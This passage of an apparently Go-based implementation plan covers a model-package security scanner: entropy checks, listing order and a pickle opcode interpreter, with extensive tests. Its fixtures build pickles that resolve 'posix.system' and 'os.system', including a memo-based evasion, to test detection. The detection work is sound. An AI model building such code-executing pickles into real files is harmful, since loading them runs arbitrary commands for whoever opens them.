 	f, err := os.Open(path)
 	if err != nil {
@@ -738,7 +894,6 @@ func streamEvidence(path string, set *EvidenceSet, cfg BinaryConfig, budget int6
 	}
 
 	scanner := newStringScanner(set, cfg)
-	pickles := newPickleScanner(set)
 
 	var read int64
 	buf := make([]byte, evidenceReadChunk)
@@ -756,9 +911,6 @@ func streamEvidence(path string, set *EvidenceSet, cfg BinaryConfig, budget int6
 			if _, wErr := scanner.Write(chunk); wErr != nil {
 				return fmt.Errorf("scan %s: %w", path, wErr)
 			}
-			if _, wErr := pickles.Write(chunk); wErr != nil {
-				return fmt.Errorf("scan %s: %w", path, wErr)
-			}
 			read += int64(n)
 		}
 		if readErr == io.EOF {
@@ -769,19 +921,23 @@ func streamEvidence(path string, set *EvidenceSet, cfg BinaryConfig, budget int6
 		}
 	}
 	scanner.Flush()
-	pickles.Flush()
 	return nil
 }
 
 // Finalize sorts and indexes a finished listing.
 //
-// The order has to be total and independent of how the evidence was gathered,
-// because Finding.Line is an index into this list: an order that varied between
-// runs would make the same finding report a different line each time, and two
+// The order has to be independent of how the evidence was gathered, because
+// Finding.Line is an index into this list: an order that varied between runs
+// would make the same finding report a different line each time, and two
 // reports of the same file would stop being diffable. The sort key is
-// (Offset, Source, Text) - byte order first, so the listing reads front to back,
-// with the structural evidence that carries no offset (all zero) ahead of it,
-// which puts "what the file is" before "what it says".
+// (Offset, Source, Text) - byte order first, so the listing reads front to back.
+// Structural evidence leads because it carries offset 0 while real evidence
+// usually carries a positive offset, which puts "what the file is" before "what
+// it says"; a string that genuinely starts at offset 0 interleaves with it, and
+// that is fine. The comparator does not special-case the source, so exact
+// (Offset, Source, Text) ties are broken by SliceStable's insertion order - the
+// key is not total, but tied lines are byte-identical and interchangeable, so
+// which one lands first cannot change a finding.
 func (s *EvidenceSet) Finalize() {
 	for i := range s.Lines {
 		s.Lines[i].Index = 0
@@ -802,7 +958,9 @@ func (s *EvidenceSet) Finalize() {
 
 // Render draws the listing as the numbered lines the Tier 2 prompt shows. The
 // index it prints is EvidenceLine.Index, so a line the model names is a line the
-// report can be searched for.
+// report can be searched for. It expects a set that has been through Finalize:
+// Index is zero until then, so calling it earlier prints 0 for every line and
+// disables the maxLines cutoff.
 func (s *EvidenceSet) Render(maxLines int) string {
 	var b strings.Builder
 	for _, l := range s.Lines {
@@ -852,32 +1010,52 @@ type BinaryConfig struct {
 	// zip's directory and the pickle stapled after the last member are both within
 	// it of one end or the other.
 	HeadTailBytes int64
-	// MaxSectionBytes bounds one ELF section read.
-	MaxSectionBytes int64
+	// There is deliberately no per-section byte cap, and its absence is a decision
+	// rather than an omission. An earlier design had MaxSectionBytes and read each
+	// executable section with io.ReadAll under it; the cap fired on ordinary real
+	// libraries - .text of a large shared object crosses any fixed section cap once
+	// the library is big enough - and a firing cap is a structural bound, so it
+	// blocked a package because a library was merely large. The section read now
+	// streams through the entropy histogram in fixed-size chunks (see
+	// countSection), so memory is O(1) regardless of section size and there is
+	// nothing for a per-section cap to protect. The remaining per-ELF bound is
+	// MaxStreamBytes, applied as a per-file budget over the sections this parse
+	// reads; breaching *that* is what stays structural, and it takes three
+	// gigabytes of executable sections to reach.
 	// MaxArchiveMembers bounds how many container members are examined.
 	MaxArchiveMembers int
-	// MaxArchiveMemberBytes bounds total decompressed bytes per container.
+	// MaxArchiveMemberBytes bounds the bytes of the ELF/pickle members read whole
+	// across one container: the container's own total decompressed size is not
+	// bounded, because a member that is neither an ELF nor a pickle is classified
+	// and skipped without being read into memory.
 	MaxArchiveMemberBytes int64
-	// MaxFindings caps findings across the whole binary pass.
+	// MaxFindings is a listing budget across the whole binary pass, not a bound on
+	// the verdict.
 	//
 	// It is deliberately not the source scanner's cap. The two channels are capped
-	// separately and the merge re-truncates neither, because a shared ceiling
-	// couples them in the one direction that costs a model package: reaching a cap
-	// sets Truncated, Truncated fails ProvesCleanScan, and a failed scan has the
-	// package deleted. A shared 200 would let a source arm carrying 190 findings
-	// and a binary arm carrying 20 push a package that used to import into that
-	// state, and would choose which findings to drop by path order rather than by
-	// importance. Nothing recorded comes near either cap - the highest finding
-	// count in any stored report in this repository is 7 for one sample and 80 for
-	// a whole 100-sample corpus - so the ceiling that protects the model is the
-	// blocking, not the cap.
+	// separately and the merge re-truncates neither: a shared ceiling would let a
+	// large source arm evict binary findings by path order - and the binary arm is
+	// the only one that can see a .so or a pickle at all - and it would choose
+	// which findings to drop by path order rather than by importance.
 	//
-	// 50 rather than 200 because the evidence families number ten
-	// (NET_002/CMD_001/DYN_001/BIN_001/BIN_002/PKL_001/FIL_001/PER_001/ENV_001/
-	// OBF_001): fifty findings is five instances of every family, far past the
-	// point where another instance changes the verdict. Worst case LLM calls go
-	// from 200 to 250, and only when both arms saturate - a state that already
-	// blocks and deletes regardless of how many calls it costs.
+	// Reaching it does not withhold a pass. The cap drops LOW findings and only
+	// LOW (see BinaryScanner.ScanDirectory): HIGH blocks under `assist` and
+	// `gate`, MEDIUM blocks under `gate`, and both are kept whatever the budget.
+	// The drop is recorded on the summary as findings_capped/findings_dropped
+	// rather than folded into Report.Truncated, which ProvesCleanScan refuses on:
+	// a channel that refused the import for having found too much would be a
+	// channel the operator has to tune against, and tuning it is the one thing a
+	// fail-closed control must not require.
+	//
+	// 50 because the evidence families number ten
+	// (NET_002/CMD_001/CMD_002/DYN_001/PKL_001/BIN_001/BIN_002/PER_002/FIL_002/
+	// ENV_002): fifty findings is five instances of every family, far past the
+	// point where another instance changes the verdict. Nothing recorded comes
+	// near it - the highest finding count in any stored report in this repository
+	// is 7 for one sample and 80 for a whole 100-sample corpus, and 80 is a corpus
+	// total rather than one package's. Worst case LLM calls go from 200 to 250, and
+	// only when both arms saturate, and the binary arm can exceed its own budget
+	// when the extra findings are HIGH.
 	MaxFindings int
 	// HighEntropyThreshold is the bits-per-byte above which a section or file is
 	// called near-random. Compiled code sits near 6.0-6.5; 7.5 is far enough
@@ -901,12 +1079,13 @@ func DefaultBinaryConfig() BinaryConfig {
 		MaxStreamBytes:        3 * 1024 * 1024 * 1024,
 		MaxFullScanBytes:      64 * 1024 * 1024,
 		HeadTailBytes:         1 << 20,
-		MaxSectionBytes:       16 * 1024 * 1024,
 		MaxArchiveMembers:     4096,
 		MaxArchiveMemberBytes: 256 * 1024 * 1024,
 		// Not DefaultConfig().MaxFindings: the two channels are capped
-		// independently and the merge re-truncates neither. See the field comment.
-		MaxFindings:         50,
+		// independently and the merge re-truncates neither. It is a listing budget
+		// rather than a completeness bound - reaching it never withholds a pass.
+		// See the field comment.
+		MaxFindings:          50,
 		HighEntropyThreshold: 7.5,
 		SkipDirs:             DefaultConfig().SkipDirs,
 	}
@@ -934,9 +1113,6 @@ func normalizeBinaryConfig(cfg BinaryConfig) BinaryConfig {
 	}
 	if cfg.HeadTailBytes <= 0 {
 		cfg.HeadTailBytes = def.HeadTailBytes
-	}
-	if cfg.MaxSectionBytes <= 0 {
-		cfg.MaxSectionBytes = def.MaxSectionBytes
 	}
 	if cfg.MaxArchiveMembers <= 0 {
 		cfg.MaxArchiveMembers = def.MaxArchiveMembers
@@ -975,6 +1151,11 @@ func isExecutableKind(k BinaryKind) bool {
 
 // evidenceError builds the set a failed extraction returns, so that the scanner
 // has one shape to handle rather than two.
+//
+// Bound is left zeroed, which is only the right default if consumers consult Err
+// before Bound: Structural is false here, so a reader that checked Bound first
+// would see a failed extraction as a clean scan. Callers must treat Err as the
+// first thing they look at.
 func evidenceError(path string, kind BinaryKind, err error) *EvidenceSet {
 	return &EvidenceSet{File: path, Kind: kind, seen: map[string]bool{}, Err: err}
 }
@@ -1043,6 +1224,21 @@ func TestShannonEntropy(t *testing.T) {
 			t.Errorf("entropy = %v, want 0", got)
 		}
 	})
+
+	t.Run("a total of zero returns zero rather than an infinity", func(t *testing.T) {
+		// The histogram and the total are a pair the caller owns, and this
+		// function exists in counts form precisely so a stream can be counted as
+		// it is read - a caller can therefore hold a nonzero histogram and a zero
+		// total. Without the guard the division yields an infinity that compares
+		// false against every threshold, so a section would be reported as
+		// unremarkable by accident. Note this is not the same as an all-zero
+		// histogram, where the loop skips every byte and never divides.
+		var counts [256]int64
+		counts[0x41] = 5
+		if got := shannonEntropy(counts, 0); got != 0 {
+			t.Errorf("entropy = %v, want 0", got)
+		}
+	})
 }
 
 // TestEntropyVerdictIsMeasuredNotAssumed pins the line the extractor emits and
@@ -1068,10 +1264,22 @@ func TestEntropyVerdictIsMeasuredNotAssumed(t *testing.T) {
 	if line, ok := entropyVerdict(".text", flat, cfg); ok {
 		t.Errorf("verdict = %q for a constant buffer, want no line", line)
 	}
+
+	// The comparison is inclusive: a section measuring exactly the threshold has
+	// not exceeded it. The uniform buffer's entropy is exactly 8 by construction,
+	// so setting the threshold to 8 pins the boundary exactly - under a strict <
+	// this case would emit a line and fail.
+	atThreshold := cfg
+	atThreshold.HighEntropyThreshold = 8.0
+	if line, ok := entropyVerdict(".text", uniform, atThreshold); ok {
+		t.Errorf("verdict = %q at exactly the threshold, want no line", line)
+	}
 }
 ```
 
 在文件顶部 import 块补 `"bytes"`、`"math"`。
+
+> 两个用例各自钉住一个此前**没有牙**的断言，都是靠变异实测出来的：删掉 `shannonEntropy` 的 `if total <= 0` 守卫不失败任何用例——全零直方图下循环对每个字节都 `continue`，`h` 本来就是 0，根本走不到除法，所以「empty input is zero」那个子测试的名字在**声称**它钉的是除法，实际不是；真正钉住除法的是新增的「a total of zero」用例（非零直方图 + 零总数，没有守卫就会得到 `-Inf`）。同理把 `if h <= cfg.HighEntropyThreshold` 改成 `<` 也不失败任何用例——两个夹具都不在阈值上，`<` 与 `<=` 无法区分；新增的 `atThreshold` 段把阈值设成夹具熵值本身（恰好 8），才让边界被钉住。
 
 - [ ] **Step 2: 跑测试确认失败**
 
@@ -1162,97 +1370,552 @@ git commit -m "feat(audit): measure binary section and file entropy as packing e
 
 ---
 
-### Task 4: pickle 目标抽取
+### Task 4: pickle 目标抽取（opcode 解释器）
 
 **Files:**
 - Modify: `internal/codeaudit/binary_evidence.go`
 - Test: `internal/codeaudit/binary_evidence_test.go`
 
+背景：本任务替换一版按字节模式找目标的设计（`0x63` 后跟两段换行串，或 `0x8c`/`0x8c`/`0x93`）。那版在真实文件上就是错的：`models/examples/Retina-DKD/Retina-DKD/model/fusion_TransMUF_dkd_win_num3_lr1_ep5bc_4lnum_1_Nopretrain_DKD/net_001.pth` 里的 `data.pkl`（68362 字节、protocol 2）有 4 个真目标（`collections.OrderedDict`、`torch._utils._rebuild_tensor_v2`、`torch.FloatStorage`、`torch.LongStorage`，都在 `GLOBAL` 上），字节扫描器报出 39 个，其中只有 2 个干净、1 个损坏（`module="k.windows_weightq\x02ctorch._utils"`），并且因为 offset 150 处一个假匹配吞掉了 685 字节，把 offset 828 的真实 `torch.LongStorage` 整个漏掉。原因是 pickle 的数据段持有任意字节：一个字符串操作数的载荷里可以出现 `0x63` 与换行，扫描器把它读成 opcode，于是错位。所以这一版把解析器换成 opcode 解释器——它按语法消费每个 opcode 的操作数，因此不会错位；它带一张 memo 表，因为 `MEMOIZE`/`BINPUT`/`PUT` + `BINGET`/`GET` 是文档化的规避：模块名先存进 memo 再取回，任何"相邻性"扫描都看不见它，但取回的值仍在值栈上，解释器照认得。
+
 - [ ] **Step 1: 写失败测试**
 
-追加到 `binary_evidence_test.go`：
+追加到 `binary_evidence_test.go`（import 块补 `archive/zip`、`bytes`、`encoding/binary`、`io`；`os`/`strings`/`testing` 已在 Task 2 引入）：
 
 ```go
-func TestPickleTargetsFindsGlobalOpcode(t *testing.T) {
-	// Protocol 4 header, then GLOBAL ("c") with the module and name each
-	// newline-terminated, then STOP.
-	data := []byte("\x80\x04cposix\nsystem\n.")
-
-	targets := pickleTargets(data)
-	if len(targets) != 1 {
-		t.Fatalf("targets = %+v, want exactly one", targets)
+// runPickleStream feeds data to a scanner in fixed-size chunks, which is the
+// only way a boundary bug shows up: at 64 KiB every fixture here fits in a
+// single chunk, and a scanner that mishandled a split operand would look
+// perfect.
+func runPickleStream(t *testing.T, data []byte, chunk int) *EvidenceSet {
+	t.Helper()
+	if chunk < 1 {
+		chunk = 1
 	}
-	if targets[0].Module != "posix" || targets[0].Name != "system" {
-		t.Errorf("target = %+v, want posix.system", targets[0])
-	}
-	if targets[0].Offset != 2 {
-		t.Errorf("offset = %d, want 2 (the GLOBAL opcode)", targets[0].Offset)
-	}
-}
-
-func TestPickleTargetsFindsStackGlobal(t *testing.T) {
-	// Protocol 4, then SHORT_BINUNICODE "posix", SHORT_BINUNICODE "system",
-	// STACK_GLOBAL (0x93).
-	data := []byte("\x80\x04\x8c\x05posix\x8c\x06system\x93.")
-
-	targets := pickleTargets(data)
-	if len(targets) != 1 || targets[0].Module != "posix" || targets[0].Name != "system" {
-		t.Fatalf("targets = %+v, want one posix.system", targets)
-	}
-}
-
-// TestPickleTargetsReadsTorchRebuilders is the false-positive guard that matters
-// most: a real .pt checkpoint is a stream of STACK_GLOBAL references to torch's
-// rebuilders, and the extractor must read them all - the deny list that decides
-// which of them is dangerous is the rule table's business, not the extractor's.
-// An extractor that filtered here would make the rule table unable to state the
-// policy, and unable to be tested against it.
-func TestPickleTargetsReadsTorchRebuilders(t *testing.T) {
-	name := "torch._utils._rebuild_tensor_v2"
-	data := append([]byte("\x80\x04\x8c\x08torch._u\x8c"), byte(len(name)))
-	data = append(data, name...)
-	data = append(data, 0x93, '.')
-
-	targets := pickleTargets(data)
-	if len(targets) != 1 {
-		t.Fatalf("targets = %+v, want one", targets)
-	}
-	if targets[0].Module != "torch._u" || targets[0].Name != name {
-		t.Errorf("target = %+v, want torch._u / %s", targets[0], name)
-	}
-}
-
-// TestPickleTargetsIgnoresOrdinaryBytes pins that the scan is a structural
-// match, not a substring search: the words appear, but not in the opcode shape,
-// so nothing is reported.
-func TestPickleTargetsIgnoresOrdinaryBytes(t *testing.T) {
-	data := []byte("the posix system call interface is described here")
-	if got := pickleTargets(data); len(got) != 0 {
-		t.Errorf("targets = %+v, want none from prose", got)
-	}
-}
-
-func TestPickleTargetsCarryAcrossChunks(t *testing.T) {
-	set := newTestEvidence("x.bin", KindRaw)
+	set := newTestEvidence("x.pkl", KindPickle)
 	p := newPickleScanner(set)
-	// Split inside the module name: a scanner without a carry sees two
-	// fragments and reports nothing.
-	if _, err := p.Write([]byte("\x80\x04cpos")); err != nil {
-		t.Fatal(err)
-	}
-	if _, err := p.Write([]byte("ix\nsystem\n.")); err != nil {
-		t.Fatal(err)
-	}
-	p.Flush()
-
-	var got []string
-	for _, l := range set.Lines {
-		if l.Source == SourcePickle {
-			got = append(got, l.Text)
+	for i := 0; i < len(data); i += chunk {
+		j := i + chunk
+		if j > len(data) {
+			j = len(data)
+		}
+		if _, err := p.Write(data[i:j]); err != nil {
+			t.Fatalf("write: %v", err)
 		}
 	}
+	p.Flush()
+	return set
+}
+
+func pickleTargetsOf(set *EvidenceSet) []string {
+	var out []string
+	for _, l := range set.Lines {
+		if l.Source == SourcePickle {
+			out = append(out, l.Text)
+		}
+	}
+	return out
+}
+
+// pickleBinUnicode encodes a protocol-2 BINUNICODE operand: the opcode, a 4-byte
+// little-endian length, then the bytes. The length prefix is the whole difference
+// between a scanner that reads this operand and one that reads into it.
+func pickleBinUnicode(s string) []byte {
+	b := []byte{0x58, 0, 0, 0, 0}
+	binary.LittleEndian.PutUint32(b[1:], uint32(len(s)))
+	return append(b, s...)
+}
+
+// pickleGlobal encodes "c module\nname\n".
+func pickleGlobal(mod, name string) []byte {
+	return []byte("c" + mod + "\n" + name + "\n")
+}
+
+// TestPickleInterpreterFindsTargetsInItsTwoEncodings pins both spellings of
+// "resolve this attribute" and the offset rule: an evidence offset is the
+// opcode's own offset, so it points at the 'c' of GLOBAL and the 0x93 of
+// STACK_GLOBAL, never at a string operand.
+func TestPickleInterpreterFindsTargetsInItsTwoEncodings(t *testing.T) {
+	data := []byte{0x80, 0x04}
+	data = append(data, pickleGlobal("posix", "system")...)
+	data = append(data, 0x8c, 0x02)
+	data = append(data, "os"...)
+	data = append(data, 0x8c, 0x06)
+	data = append(data, "system"...)
+	data = append(data, 0x93, 0x2e) // STACK_GLOBAL, STOP
+
+	set := runPickleStream(t, data, 64*1024)
+	got := pickleTargetsOf(set)
+	want := []string{"posix.system", "os.system"}
+	if strings.Join(got, ",") != strings.Join(want, ",") {
+		t.Fatalf("targets = %v, want %v", got, want)
+	}
+	if set.Lines[0].Offset != 2 {
+		t.Errorf("offset = %d, want 2 (the GLOBAL opcode)", set.Lines[0].Offset)
+	}
+	if set.Bound.Structural {
+		t.Errorf("structural bound on a well-formed stream: %s", set.Bound.Reason)
+	}
+}
+
+// TestPickleInterpreterFindsTheTargetAfterBinaryData is the test the old design
+// would have failed, and it is why this task exists. The string operand's payload
+// ends with an unterminated run after a stray 0x63, so a byte scan reads a
+// spurious GLOBAL whose operands run across the string boundary and swallow the
+// genuine GLOBAL that follows - exactly how net_001.pth's torch.LongStorage was
+// being lost. The interpreter must find both targets and must not read a byte
+// inside the payload as an opcode.
+func TestPickleInterpreterFindsTheTargetAfterBinaryData(t *testing.T) {
+	stray := "c" + "junk\n" + "c" + strings.Repeat("Z", 300)
+	data := []byte{0x80, 0x02}
+	data = append(data, pickleBinUnicode(stray)...)
+	data = append(data, pickleGlobal("posix", "system")...)
+	data = append(data, pickleGlobal("torch._utils", "_rebuild_tensor_v2")...)
+	data = append(data, 0x2e)
+
+	set := runPickleStream(t, data, 64*1024)
+	got := pickleTargetsOf(set)
+	want := []string{"posix.system", "torch._utils._rebuild_tensor_v2"}
+	if strings.Join(got, ",") != strings.Join(want, ",") {
+		t.Fatalf("targets = %v, want %v", got, want)
+	}
+	if set.Bound.Structural {
+		t.Errorf("structural bound on a well-formed stream: %s", set.Bound.Reason)
+	}
+}
+
+// TestPickleInterpreterResolvesStackGlobalThroughTheMemo pins the evasion the
+// memo table exists to close: the module and name are MEMOIZEd, fetched back with
+// BINGET, and only then fed to STACK_GLOBAL. Neither string is adjacent to the
+// opcode, so an adjacency scan sees nothing.
+func TestPickleInterpreterResolvesStackGlobalThroughTheMemo(t *testing.T) {
+	data := []byte{0x80, 0x04, 0x8c, 0x05}
+	data = append(data, "posix"...)
+	data = append(data, 0x94) // MEMOIZE -> memo[0]
+	data = append(data, 0x8c, 0x06)
+	data = append(data, "system"...)
+	data = append(data, 0x94)       // MEMOIZE -> memo[1]
+	data = append(data, 0x68, 0x00) // BINGET 0
+	data = append(data, 0x68, 0x01) // BINGET 1
+	data = append(data, 0x93, 0x2e) // STACK_GLOBAL, STOP
+
+	got := pickleTargetsOf(runPickleStream(t, data, 64*1024))
 	if len(got) != 1 || got[0] != "posix.system" {
-		t.Fatalf("pickle evidence = %v, want [posix.system]", got)
+		t.Fatalf("targets = %v, want [posix.system]", got)
+	}
+}
+
+// TestPickleInterpreterReadsInstAsATarget pins the protocol-0/1 spelling of the
+// same thing: INST carries module and name inline, like GLOBAL.
+func TestPickleInterpreterReadsInstAsATarget(t *testing.T) {
+	data := append([]byte{0x80, 0x04}, []byte("iposix\nsystem\n")...)
+	data = append(data, 0x2e)
+	got := pickleTargetsOf(runPickleStream(t, data, 64*1024))
+	if len(got) != 1 || got[0] != "posix.system" {
+		t.Fatalf("targets = %v, want [posix.system]", got)
+	}
+}
+
+// TestPickleInterpreterIsChunkInvariant pins the property that makes the
+// streaming contract correct: the parse carries its own state, so the listing
+// cannot depend on where the reads split. The sizes below include 1 and the whole
+// stream in a single Write, because those are the two extremes a one-chunk fixture
+// would never exercise, and splitAfterLength, which puts a chunk boundary in the
+// one place the parser is weakest - right after the length prefix of a zero-length
+// counted operand, so that operand's completion is the first thing the next call
+// sees.
+//
+// The zero-length operand is in the fixture because the interpreter used to
+// mishandle exactly that: see TestPickleInterpreterParsesCPythonsZeroLengthOperands
+// for why it is in every real checkpoint rather than being a synthetic edge.
+func TestPickleInterpreterIsChunkInvariant(t *testing.T) {
+	data := []byte{0x80, 0x04}
+	data = append(data, pickleBinUnicode(strings.Repeat("data\x63\n", 400))...)
+	data = append(data, pickleGlobal("os", "system")...)
+	// A zero-length counted operand. pickle.dumps emits these, and the length
+	// prefix is BINUNICODE's opcode plus four length bytes.
+	zeroLenAt := len(data)
+	data = append(data, pickleBinUnicode("")...)
+	splitAfterLength := zeroLenAt + 5
+	data = append(data, 0x8c, 0x03)
+	data = append(data, "abc"...)
+	data = append(data, 0x8c, 0x03)
+	data = append(data, "def"...)
+	data = append(data, 0x93, 0x2e)
+
+	want := "os.system,abc.def"
+	for _, size := range []int{1, 2, 3, 5, 8, 64, 1024, 64 * 1024, splitAfterLength, len(data)} {
+		set := runPickleStream(t, data, size)
+		if got := strings.Join(pickleTargetsOf(set), ","); got != want {
+			t.Fatalf("chunk=%d gave %q, want %q", size, got, want)
+		}
+		if set.Bound.Structural {
+			t.Fatalf("chunk=%d set a structural bound: %s", size, set.Bound.Reason)
+		}
+	}
+}
+
+// TestPickleInterpreterBoundsAnUnknownOpcode pins the fail-closed direction for
+// the one case the interpreter cannot recover from: a byte it cannot classify is
+// a place it does not know the next opcode starts, and stopping without a bound
+// would let a later opcode hide.
+func TestPickleInterpreterBoundsAnUnknownOpcode(t *testing.T) {
+	data := []byte{0x80, 0x02}
+	data = append(data, pickleGlobal("posix", "system")...)
+	data = append(data, 0x99, 0x2e) // 0x99 is not a pickle opcode
+
+	set := runPickleStream(t, data, 64*1024)
+	if !set.Bound.Structural {
+		t.Fatal("unknown opcode did not set Bound.Structural")
+	}
+	if got := pickleTargetsOf(set); len(got) != 1 || got[0] != "posix.system" {
+		t.Errorf("targets before the unknown opcode were lost: %v", got)
+	}
+}
+
+// TestPickleInterpreterBoundsATruncatedOperand pins that an operand the stream
+// claimed and did not deliver is a structural gap, not a clean end.
+func TestPickleInterpreterBoundsATruncatedOperand(t *testing.T) {
+	// SHORT_BINUNICODE declares 5 bytes and delivers 3.
+	mid := []byte{0x80, 0x02, 0x8c, 0x05, 'p', 'o', 's'}
+	if set := runPickleStream(t, mid, 64*1024); !set.Bound.Structural {
+		t.Error("a stream ending mid-opcode did not set Bound.Structural")
+	}
+	// A declared length past EOF is the same event.
+	past := append([]byte{0x80, 0x02}, 0x58, 0xff, 0xff, 0x00, 0x00)
+	if set := runPickleStream(t, past, 64*1024); !set.Bound.Structural {
+		t.Error("a length past EOF did not set Bound.Structural")
+	}
+}
+
+// TestPickleInterpreterBoundsAStreamThatNeverStops pins that a stream which never
+// reaches STOP is structurally incomplete - and that an empty stream is not, for
+// the same reason a bound that cost nothing is not a bound.
+func TestPickleInterpreterBoundsAStreamThatNeverStops(t *testing.T) {
+	for _, data := range [][]byte{{0x80, 0x02}, {0x80, 0x02, 0x4e}} {
+		if set := runPickleStream(t, data, 64*1024); !set.Bound.Structural {
+			t.Errorf("%x: a stream without STOP did not set Bound.Structural", data)
+		}
+	}
+	if set := runPickleStream(t, nil, 64*1024); set.Bound.Structural {
+		t.Error("an empty stream set Bound.Structural")
+	}
+}
+
+// TestPickleInterpreterToleratesBytesAfterStop pins the one place trailing data
+// is not a bound: the unpickler stops at STOP too, so the bytes after it are
+// outside the structure that can execute. They stay visible as a notice, so the
+// loss is not silent.
+func TestPickleInterpreterToleratesBytesAfterStop(t *testing.T) {
+	data := []byte{0x80, 0x02}
+	data = append(data, pickleGlobal("posix", "system")...)
+	data = append(data, 0x2e)
+	data = append(data, []byte("this padding is not part of the pickle")...)
+
+	set := runPickleStream(t, data, 64*1024)
+	if set.Bound.Structural {
+		t.Fatalf("bytes after STOP set Bound.Structural: %s", set.Bound.Reason)
+	}
+	var notice bool
+	for _, l := range set.Lines {
+		if l.Source == SourceNotice {
+			notice = true
+		}
+	}
+	if !notice {
+		t.Error("bytes after STOP produced no notice; the loss is invisible")
+	}
+}
+
+// TestPickleInterpreterBoundsAnUnresolvedStackGlobalOperand pins the bound to the
+// only condition that hides a target - an unresolvable value actually used as a
+// module or name - and pins the other half too: a dangling reference that is
+// never so used is tolerated, because being strict there would put a bound on
+// benign streams.
+func TestPickleInterpreterBoundsAnUnresolvedStackGlobalOperand(t *testing.T) {
+	used := []byte{0x80, 0x04, 0x68, 0x00, 0x8c, 0x06}
+	used = append(used, "system"...)
+	used = append(used, 0x93, 0x2e) // BINGET 0 (never written), STACK_GLOBAL
+	if set := runPickleStream(t, used, 64*1024); !set.Bound.Structural {
+		t.Error("an unresolved STACK_GLOBAL operand did not set Bound.Structural")
+	}
+	unused := []byte{0x80, 0x04, 0x68, 0x00, 0x2e} // BINGET 0, never used
+	if set := runPickleStream(t, unused, 64*1024); set.Bound.Structural {
+		t.Errorf("an unused dangling reference set Bound.Structural: %s", set.Bound.Reason)
+	}
+}
+
+// TestPickleInterpreterNamesNothingInProse pins that the parser is a parser: the
+// words appear, but not in opcode shape, so no target is reported. (In production
+// the interpreter is gated to streams claimed as pickles, so prose never reaches
+// it; this asserts the parser's own silence.)
+func TestPickleInterpreterNamesNothingInProse(t *testing.T) {
+	data := []byte("the posix system call interface is described here")
+	if got := pickleTargetsOf(runPickleStream(t, data, 64*1024)); len(got) != 0 {
+		t.Errorf("targets = %v, want none from prose", got)
+	}
+}
+
+// TestPickleInterpreterSurvivesAdversarialBytes pins that the parser is total:
+// every input either parses or records why it could not, and none of them makes
+// it panic. It is fed attacker-controlled bytes by definition. The bytes are
+// enumerated rather than random so the test is deterministic.
+func TestPickleInterpreterSurvivesAdversarialBytes(t *testing.T) {
+	for b := 0; b < 256; b++ {
+		runPickleStream(t, []byte{0x80, 0x04, byte(b), byte(b), byte(b), 0x2e}, 3)
+	}
+	full := append([]byte{0x80, 0x04}, pickleGlobal("os", "system")...)
+	full = append(full, 0x2e)
+	for n := 0; n <= len(full); n++ { // every truncation of a valid stream
+		runPickleStream(t, full[:n], 1)
+	}
+}
+
+// TestPickleInterpreterReadsTheRealCheckpoint runs the interpreter over the one
+// real checkpoint in this repository that exercises the defect: a protocol-2
+// torch stream whose four GLOBAL targets sit around large binary operands, the
+// last of them at an offset a byte scan was swallowing. It skips when the file is
+// absent, because the corpus is not carried in every checkout.
+func TestPickleInterpreterReadsTheRealCheckpoint(t *testing.T) {
+	const ckpt = "../../models/examples/Retina-DKD/Retina-DKD/model/" +
+		"fusion_TransMUF_dkd_win_num3_lr1_ep5bc_4lnum_1_Nopretrain_DKD/net_001.pth"
+	if _, err := os.Stat(ckpt); err != nil {
+		t.Skipf("corpus checkpoint not present: %v", err)
+	}
+	zr, err := zip.OpenReader(ckpt)
+	if err != nil {
+		t.Fatalf("open %s: %v", ckpt, err)
+	}
+	defer zr.Close()
+
+	var pkl []byte
+	for _, f := range zr.File {
+		if strings.HasSuffix(f.Name, "/data.pkl") {
+			rc, err := f.Open()
+			if err != nil {
+				t.Fatal(err)
+			}
+			pkl, err = io.ReadAll(rc)
+			rc.Close()
+			if err != nil {
+				t.Fatal(err)
+			}
+		}
+	}
+	if pkl == nil {
+		t.Fatal("no data.pkl member in the checkpoint")
+	}
+
+	set := runPickleStream(t, pkl, 64*1024)
+	got := pickleTargetsOf(set)
+	want := []string{
+		"collections.OrderedDict",
+		"torch._utils._rebuild_tensor_v2",
+		"torch.FloatStorage",
+		"torch.LongStorage", // the target the byte scan missed
+	}
+	if strings.Join(got, ",") != strings.Join(want, ",") {
+		t.Fatalf("targets = %v, want %v", got, want)
+	}
+	if set.Bound.Structural {
+		t.Errorf("the real checkpoint set Bound.Structural: %s", set.Bound.Reason)
+	}
+}
+
+// TestPickleInterpreterParsesCPythonsZeroLengthOperands pins the interpreter
+// against the two byte strings CPython itself produces for a zero-length operand,
+// because the defect they exercise was in the interpreter, not in a hand-built
+// fixture. Each is fed both in one 64 KiB chunk and in a single Write, since the
+// streaming reader reads a file that fits one chunk in a single call. The assertion
+// is on the extracted targets as well as the bound: the BINUNICODE case used to
+// both set a structural bound and lose the target that followed it, so a test that
+// checked only the bound would see half the defect.
+//
+// The defect is worth stating in the test that pins it. step used to return 0
+// after completing a counted operand whose declared length was zero, and Write
+// reads a 0 as "needs more input" - so it stopped, and the bytes after the operand
+// stayed in the buffer. When the operand sat in the final Write, nothing drained
+// that buffer and Flush reported a complete, valid pickle as ending without STOP.
+// KindPickle is an executable kind, so that bound blocks the import and deletes
+// the package. Every real data.pkl in this repository has a zero-length BINUNICODE
+// (the empty-string key of a state dict), at offsets 1315, 1315, 12830, 52607 and
+// 52607 across the five of them, so this was not an edge case: it was the next
+// three packages to be audited.
+func TestPickleInterpreterParsesCPythonsZeroLengthOperands(t *testing.T) {
+	cases := []struct {
+		name    string
+		data    []byte
+		targets []string
+	}{
+		{
+			name: "pickle.dumps(b'', protocol=4): SHORT_BINBYTES of length 0",
+			data: []byte{0x80, 0x04, 0x95, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x43, 0x00, 0x94, 0x2e},
+		},
+		{
+			name:    "pickle.dumps({'': b''}, protocol=2): BINUNICODE of length 0 before a GLOBAL",
+			data:    []byte{0x80, 0x02, 0x7d, 0x71, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x71, 0x01, 0x63, 0x5f, 0x5f, 0x62, 0x75, 0x69, 0x6c, 0x74, 0x69, 0x6e, 0x5f, 0x5f, 0x0a, 0x62, 0x79, 0x74, 0x65, 0x73, 0x0a, 0x71, 0x02, 0x29, 0x52, 0x71, 0x03, 0x73, 0x2e},
+			targets: []string{"__builtin__.bytes"},
+		},
+	}
+	for _, tc := range cases {
+		for _, chunk := range []int{64 * 1024, len(tc.data)} {
+			set := runPickleStream(t, tc.data, chunk)
+			if set.Bound.Structural {
+				t.Errorf("%s (chunk=%d): structural bound: %s", tc.name, chunk, set.Bound.Reason)
+			}
+			got := pickleTargetsOf(set)
